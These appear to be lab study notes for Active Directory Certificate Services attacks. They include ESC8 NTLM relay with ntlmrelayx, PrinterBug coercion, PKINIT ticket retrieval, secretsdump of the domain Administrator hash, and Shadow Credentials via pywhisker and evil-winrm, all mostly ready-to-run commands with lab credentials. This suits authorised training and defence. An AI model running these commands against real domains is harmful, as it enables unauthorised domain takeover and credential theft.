# Pass the Certificate

Used in conjunction with:

- [Attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c)

## [AD CS](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)) NTLM Relay Attack (ESC8)

ESC8 is an NTLM relay attack targeting an ADCS HTTP endpoint.

Use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service.

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> --template `KerberosAuthentication` can vary, use tools like [certipy](https://github.com/ly4k/Certipy) to enumerate.

Wait for a user to authenticate or force authentication with [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py).

```bash
# Forces 10.129.234.109 (DC01) to attempt authentication
# against 10.10.16.12 (attacker host)

python3 printerbug.py EXAMPLE.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

# Watch for output on ntlmrelayx
```

Perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).

```bash
# Install
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
pip3 install -r requirements.txt

# If error
pip3 install -I git+https://github.com/wbond/oscrypto.git
# Kali fix error
wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb 
wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb

# Grab the ccache
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'example.local/dc01$' /tmp/dc.ccache

# Retrieve the hash and have at it
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'EXAMPLE.LOCAL/DC01$'@DC01.EXAMPLE.LOCAL
```

---

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user.

Use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system.

```bash
# Generate X.509 certificate write public key to msDS-KeyCredentialLink
pywhisker --dc-ip 10.129.234.109 -d EXAMPLE.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

# Use the generated file eFUVVTPf.pfx and password to get TGT as victim
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 EXAMPLE.LOCAL/jpinkman /tmp/jpinkman.ccache

# pass the ticket
export KRB5CCNAME=/tmp/jpinkman.ccache
klist

# Connect with evil-winrm - check if krb5.conf is properly configured
evil-winrm -i dc01.example.local -r example.local
```

> The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing  passwords or granting DCSync rights). This attack is outside the scope  of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

